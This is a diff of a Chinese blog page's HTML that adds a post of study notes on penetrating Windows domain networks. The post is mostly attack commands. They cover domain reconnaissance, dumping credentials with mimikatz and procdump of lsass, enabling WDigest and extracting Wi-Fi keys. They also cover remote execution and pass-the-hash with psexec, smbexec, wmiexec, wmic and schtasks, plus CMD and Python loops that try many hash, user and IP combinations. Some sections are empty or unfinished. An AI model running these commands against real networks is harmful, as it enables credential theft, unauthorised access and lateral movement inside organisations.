@@ -3,19 +3,22 @@
 <html class="article-header-style-default">
 <head>
 	
-	<title>博客重构 - Kali&#39;s窝</title>
+	<title>内网渗透 - Kali&#39;s窝</title>
 	<meta charset="utf-8">
 	
 		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 	
-	<meta property="og:type" content="article">
-<meta property="og:title" content="博客重构">
-<meta property="og:url" content="http://example.com/2022/05/28/%E5%8D%9A%E5%AE%A2%E9%87%8D%E6%9E%84/">
+	<meta name="description" content="分类 工作组  域环境  域控制器DC  活动目录AD（功能策略）     域环境： 单域 父域 子域 域数 域森林 Linux域环境：LDAP  内网渗透流程信息收集收集：存活主机 域控制器 网络架构 服务接口 判断网络等信息  判断域控（三种方法）： ipconfig &#x2F;all -dns  net view &#x2F;domain  net time &#x2F;domain   收集用户和用户信息 domai">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透">
+<meta property="og:url" content="http://example.com/2022/05/30/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
 <meta property="og:site_name" content="Kali&#39;s窝">
+<meta property="og:description" content="分类 工作组  域环境  域控制器DC  活动目录AD（功能策略）     域环境： 单域 父域 子域 域数 域森林 Linux域环境：LDAP  内网渗透流程信息收集收集：存活主机 域控制器 网络架构 服务接口 判断网络等信息  判断域控（三种方法）： ipconfig &#x2F;all -dns  net view &#x2F;domain  net time &#x2F;domain   收集用户和用户信息 domai">
 <meta property="og:locale">
-<meta property="article:published_time" content="2022-05-28T07:26:23.000Z">
-<meta property="article:modified_time" content="2022-05-28T07:28:09.950Z">
+<meta property="article:published_time" content="2022-05-30T15:15:19.000Z">
+<meta property="article:modified_time" content="2022-05-30T15:16:23.430Z">
 <meta property="article:author" content="egsec">
+<meta property="article:tag" content="内网渗透">
 <meta name="twitter:card" content="summary">
 
 	<meta name="theme-color" content="#5e72e4">
@@ -578,14 +581,22 @@
 	<article class="post post-full card bg-white shadow-sm border-0 ">
 	<header class="post-header text-center">
 		
-		<a class="post-title" href="/2022/05/28/%E5%8D%9A%E5%AE%A2%E9%87%8D%E6%9E%84/">博客重构</a>
+		<a class="post-title" href="/2022/05/30/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
 		<div class="post-meta">
 			
 						
 						<div class="post-meta-detail post-meta-detail-time">
 							<i class="fa fa-clock-o" aria-hidden="true"></i>
-							<time title="发布于 2022-5-28 15:26:23 | 编辑于 2022-5-28 15:28:09">2022-5-28 15:26
+							<time title="发布于 2022-5-30 23:15:19 | 编辑于 2022-5-30 23:16:23">2022-5-30 23:15
 							</time>
+						</div>
+					
+						
+							<div class="post-meta-devide">|</div>
+						
+						<div class="post-meta-detail post-meta-detail-categories">
+							<i class="fa fa-bookmark-o" aria-hidden="true"></i>
+							<a class="post-meta-detail-catagory-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
 						</div>
 					
 						
@@ -593,7 +604,7 @@
 						
 						<div class="post-meta-detail post-meta-detail-words">
 							<i class="fa fa-file-word-o" aria-hidden="true"></i>
-							0 字
+							1.5k 字
 						</div>
 					
 						
@@ -601,7 +612,7 @@
 						
 						<div class="post-meta-detail post-meta-detail-readingtime">
 							<i class="fa fa-hourglass-end" aria-hidden="true"></i>
-							1 分钟
+							7 分钟
 						</div>
 					
 		</div>
@@ -609,13 +620,278 @@
 	</header>
 
 	<div class="post-content" id="post_content">
-		
+		<h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><ul>
+<li><p>工作组</p>
+</li>
+<li><p>域环境</p>
+<ul>
+<li><p>域控制器DC</p>
+</li>
+<li><p>活动目录AD（功能策略）</p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="域环境："><a href="#域环境：" class="headerlink" title="域环境："></a>域环境：</h1><ul>
+<li>单域</li>
+<li>父域</li>
+<li>子域</li>
+<li>域数</li>
+<li>域森林</li>
+<li>Linux域环境：LDAP</li>
+</ul>
+<h1 id="内网渗透流程"><a href="#内网渗透流程" class="headerlink" title="内网渗透流程"></a>内网渗透流程</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>收集：存活主机 域控制器 网络架构 服务接口 判断网络等信息</p>
+<ul>
+<li><p>判断域控（三种方法）：</p>
+<pre><code>ipconfig /all -dns
+
+net view /domain
+
+net time /domain
+</code></pre>
+</li>
+<li><p>收集用户和用户信息</p>
+<pre><code>domain admins 域管理员（控制权）
+domain computers 域内机器
+domain controllers 域控制器
+domain guest 域访客（低权限）
+domain users 域用户
+enterprise admins 企业系统管理员用户（对域控有控制权）
+</code></pre>
+</li>
+<li><p>收集凭据信息：密文，明文，口令等</p>
+<pre><code>计算机用户Hash 明文获取：mimikatz(win),mimipenguin(linux)
+
+计算机各种协议服务口令获取：lazagne(all),xenarmor(win)
+
+Wi-Fi信息：
+netsh wlan show profiles
+netsh wlan show profile name=&quot;wifiname&quot; key=clear
+
+源码，备份文件，web管理入口，浏览器保持的密码，浏览器cookies,用户会话：3389 ipc$，回收站内容
+
+win保存的WiFi密码，网络内部的账号密码：Email VPN ftp oa ...
+</code></pre>
+</li>
+<li><p>域控架构探测</p>
+<pre><code>域控制名：net time /domain nslookup ping
+
+域内存活主机(批量脚本)：for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.2.%I | findstr &quot;TTL=&quot;
+
+工具：nmap masscan Powershell---Nishang工具 empire ...
+</code></pre>
+</li>
+</ul>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h2 id="横向渗透-域环境下（重点）"><a href="#横向渗透-域环境下（重点）" class="headerlink" title="横向渗透 - 域环境下（重点）"></a>横向渗透 - 域环境下（重点）</h2><h3 id="传递（明文-amp-Hash）"><a href="#传递（明文-amp-Hash）" class="headerlink" title="传递（明文&amp;Hash）"></a>传递（明文&amp;Hash）</h3><ol>
+<li>加密方式</li>
+</ol>
+<ul>
+<li>windows系统<code>LM hash</code>及<code>NTLM hash</code>加密算法，个人系统在windows vista后，服务器系统在windows 2003以后，认证方式均为<code>NTLM Hash</code>。</li>
+</ul>
+<ol start="2">
+<li>at&amp;schtasks</li>
+</ol>
+<ul>
+<li><p>at</p>
+<pre><code>at &lt; windows2012
+
+建立ipc$
+
+复制文件到目标机C盘：copy add.bat \\ip\c$
+
+添加计划任务：at \ip 时间(00:00) c:\add.bat
+
+#添加用户
+add.bat &gt; &quot;net user ceshi 12345 /add&quot;
+</code></pre>
+</li>
+<li><p>schtasks</p>
+<pre><code>schtasks &gt;= Windows2012
+
+建立ipc$
+
+复制文件到目标机C盘：copy add.bat \\ip\c$
+
+创建adduser任务对应执行文件：schtasks /create /s ip /ru &quot;SYSTEM&quot; /tn adduser /sc DAILY /tr c:\add.bat
+
+运行adduser任务：schtasks /run /s ip /tn adduser /i
+
+删除adduser任务：schtasks /delete /s ip /tn adduser /f
+</code></pre>
+</li>
+<li><p>atexec-impacket：Hash传递</p>
+<pre><code>atexec.exe ./username:password@ip &quot;whoami&quot;
+
+atexec.exe domain/username:password@ip &quot;whoami&quot;
+
+atexec.exe -hashes :hash ./username@ip &quot;whoami&quot;
+</code></pre>
+</li>
+</ul>
+<ol start="2">
+<li>smb&amp;wmi</li>
+</ol>
+<ul>
+<li><p>psexec&amp;smbexec</p>
+<pre><code># Windows2012以上版本默认关闭wdigest，无法从内存中获取明文密码
+# Windows2012一下版本安装KB2871997补丁，无法从内存中获取明文密码
+
+解决方法：
+1. 利用hash传递（pth,ptk等）进行移动
+
+2. 利用其他服务协议（smb,wmi等）进行hash移动
+
+3. 利用注册表操作开启wdigest auth值进行获取
+HKLM\SYSTEM\CurrentControlSet \Control\SecurityProviders\WDigest /v \ UseLogonCredential /t REG_DWORD /d 1 /f
+
+4. 利用工具或第三方平台（hachcat）进行破解获取
+</code></pre>
+</li>
+<li><p>Procdump(官方自带)+Mimikatz配合获取</p>
+<pre><code>procdump -accepteula -ma lsass.exe lsass.dmp
+mimikatz上执行:
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonPasswords full
+#Pwdump7
+#QuarksPwdump
+```	
+</code></pre>
+</li>
+<li><p>Hashcat破解获取Windows NTML Hash</p>
+<pre><code>hashcat -a 0 -m 1000 hash file --force
+</code></pre>
+</li>
+<li><p>SMB服务利用-psexec,smbexec（官方自带）</p>
+<pre><code>利用sMB服务可以通过明文或hash传递来远程执行，条件445服务端口开放。
+
+#psexec第一种：先有ipc链接，psexec需要明文或hash传递
+net use \\192.168.3.32\ipc$ &quot;password&quot; /user:username
+psexec \\192.168.3.32 -s cmd
+#需要先有ipc链接 -s以system权限运行
+
+#psexec第二种:不 用建立IPC直接提供明文账户密码
+psexec \192.168.3.21 -u username -p password -s cmd
+psexec -hashes :$HASH$ ./username@ip
+psexec -hashes :$HASH$ domain/username@ip
+psexec -hashes :hash ./username@ip # 官方pstools无法采用hash连接
+
+#非官方自带-参考impacket工具包使用,操作简单,容易被杀
+</code></pre>
+<pre><code>#smbexec无需先ipc链接明文或nash传递
+
+smbexec domain/username:password@ip
+smbexec ./username:password@ip
+smbexec -hashes :$HASH$ ./username@ip
+smbbexec -hashes :$HASH$ domain/ username@ip
+smbexec -hashes :hash ./username@ip
+smbexec -hashes :hash domain/username@ip
+</code></pre>
+</li>
+<li><p>WMI服务利用-cscript,wmie xec,wmic</p>
+<pre><code>#WMI (windows Management Instrumentation)是通过135端口进行利用，支持用户名明文或者hash的方式进行认证，并且该方法不会在目标日志系统留下痕迹。
+
+#自带wMIc明文传递无回显
+wmic /node:ip /user:username /password:password process call create &quot; cmd.exe /c ipconfig &gt;C:\1.txt&quot;
+
+#自带cscript明文传递有回显
+cscript //nologo wmiexec.vbs /shell ip username password
+
+#套件impacket wmiexec 明文或hash传递 有回显exe版本
+wmiexec ./username:password@ip &quot;whoami&quot;
+wmiexec domain/username:password@ip &quot;whoami&quot;
+wmiexec -hashes :hash ./username@ip &quot;whoami&quot;
+wmiexec -hashes :hash domain/username@ip &quot;whoami&quot;
+</code></pre>
+</li>
+</ul>
+<ol start="3">
+<li>CMD脚本批量利用<br>  &#96;&#96;&#96;<br>  批量检测IP对应明文连接：<br>  FOR &#x2F;F %%i in (ips.txt) do net use \%%i\ipc$ “password” &#x2F;user:username</li>
+</ol>
+<p>  批量检测IP对应明文回显版:<br>  FOR &#x2F;F %%i in (ips.txt) do atexec.exe .&#x2F;username:password@%%i whoami</p>
+<p>  批量检测明文对应IP回显版:<br>  FOR &#x2F;F %%i in (pass.txt) do atexec.exe .&#x2F;username:%%i@ip whoami</p>
+<p>  批量检测Hash对应IP回显版:<br>  FOR &#x2F;F %%i in (hash.txt) do atexec.exe -hashes :%%i .&#x2F;username@ip whoami</p>
+<pre><code>4. Python脚本批量利用
+```python
+#用户，密码，Hash批量撞库
+
+#生产EXE：pyinstaller -F 1.py
+
+import os,time
+ips=&#123;
+&#39;192.168.3.21&#39;,
+&#39;192.168.3.32&#39;
+&#125;
+users=&#123;
+&#39;Administrator&#39;,
+&#39;webadmin&#39;
+&#125;
+hashs=&#123;
+&#39;ccef208c6485269c20db2cad21734fe7&#39;,
+&#39;518b98ad4178a53695dc997aa02d455c&#39;
+&#125;
+for ip in ips:
+  for user in users:
+    for mimahash in hashs:
+      exec = &quot;wmiexec -hashes :&quot;+mimaHash+&quot; god/&quot;+user+&quot;@&quot;+ip+&quot; whoami&quot;
+      exec1 = &quot;wmiexec -hashes :&quot;+mimaHash+&quot; ./&quot;+user+&quot;@&quot;+ip+&quot; whoami&quot;
+      print(&#39;---&gt;&#39; + exec + &#39;&lt;---&#39;)
+      print(&#39;---&gt;&#39; + exec1 + &#39;&lt;---&#39;)
+      os.system(exec)
+      os.system(exec1)
+      time.sleep(0.5)
+</code></pre>
+<ol start="5">
+<li><p>工具优缺点<br>  &#96;&#96;&#96;</p>
+</li>
+<li><p>通过官方PSTools中psexec连接时只能用明文密码进行连接，但是不会被杀毒软件拦截</p>
+</li>
+<li><p>通过官方自带命令WMIC时，只支持明文且没有回显需自己读取</p>
+</li>
+<li><p>通过官方自带命令cscript与wmiexec.vbs配合时有回显，但是只支持明文</p>
+</li>
+<li><p>通过非官方impacket-examples-windows中psexec和smbexec和wmiexec连接时可支持密文hash密码连接，但容易被杀毒软件拦截</p>
+</li>
+<li><p>现在基本通过mimikatz获取的密码都是密文的</p>
+<pre><code>
+</code></pre>
+</li>
+<li><p>PTH&amp;PTT&amp;PTK</p>
+</li>
+<li><p>winrs&amp;</p>
+</li>
+</ol>
+<h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><h1 id="资源工具"><a href="#资源工具" class="headerlink" title="资源工具"></a>资源工具</h1><pre><code>https://lgithub.com/hashcat/hashcat
+
+https://www.freebuf.com/sectool/164507.html
+
+https://github.com/gentilkiwi/mimikatz/releases
+
+https://github.com/SecureAuthCorp/impacket
+
+https://gitee.com/RichChigga/impacket-examples-windows
+
+https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools
+
+https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump
+</code></pre>
+<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><pre><code>收集密码，hash
+
+探活ip
+
+收集域用户
+</code></pre>
+
 	</div>
 
 	
 
 	
 
+	
+		<div class="post-tags">
+			<i class="fa fa-tags" aria-hidden="true"></i>
+			<a class="tag badge badge-secondary post-meta-detail-tag -none-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a>
+		</div>
 	
 </article>
 
@@ -656,7 +932,7 @@
 				<span class="btn-inner--icon"><i class="fa fa-twitter"></i></span>
 			</button>
 		</a>
-		<a target="_blank" class="no-pjax icon-telegram" href="https://telegram.me/share/url?url=http://example.com/2022/05/28/%E5%8D%9A%E5%AE%A2%E9%87%8D%E6%9E%84/&text=博客重构" tooltip="分享到 Telegram">
+		<a target="_blank" class="no-pjax icon-telegram" href="https://telegram.me/share/url?url=http://example.com/2022/05/30/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/&text=内网渗透" tooltip="分享到 Telegram">
 			<button class="btn btn-icon btn-primary" style="background: #42a5f5;border: none;">
 				<span class="btn-inner--icon"><i class="fa fa-telegram"></i></span>
 			</button>
@@ -673,11 +949,26 @@
 </div>
 <script type="text/javascript">
 	socialShare("#share", {
-	    title : '博客重构',
-	    description : '',
+	    title : '内网渗透',
+	    description : '分类
+工作组
+
+域环境
+
+域控制器DC
+
+活动目录AD（功能策略）
+
+
+
+
+域环境：
+单域
+父域
+子...',
 	    wechatQrcodeTitle : "分享到微信",
 	    wechatQrcodeHelper : '微信扫描二维码',
-	    source : 'http://example.com/2022/05/28/%E5%8D%9A%E5%AE%A2%E9%87%8D%E6%9E%84/'
+	    source : 'http://example.com/2022/05/30/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/'
 	});
 	$("#share_show")[0].onclick = function(){
 		$("#share_container").addClass("opened");
@@ -726,7 +1017,7 @@
 
 
 
-<div class="post-navigation card shadow-sm"><div class="post-navigation-item post-navigation-pre"><span class="page-navigation-extra-text"><i class="fa fa-arrow-circle-o-left" aria-hidden="true"></i>上一篇</span><a href="/2022/05/28/Hexo%E9%83%A8%E7%BD%B2%E5%92%8CGitHub%E6%8E%A8%E9%80%81/" rel="prev"> Hexo部署和GitHub推送</a></div><div class="post-navigation-item post-navigation-next"></div></div>
+<div class="post-navigation card shadow-sm"><div class="post-navigation-item post-navigation-pre"></div><div class="post-navigation-item post-navigation-next"><span class="page-navigation-extra-text">下一篇 <i class="fa fa-arrow-circle-o-right" aria-hidden="true"></i></span><a href="/2022/05/28/Hexo%E9%83%A8%E7%BD%B2%E5%92%8CGitHub%E6%8E%A8%E9%80%81/" rel="next"> Hexo部署和GitHub推送</a></div></div>
 
 
 
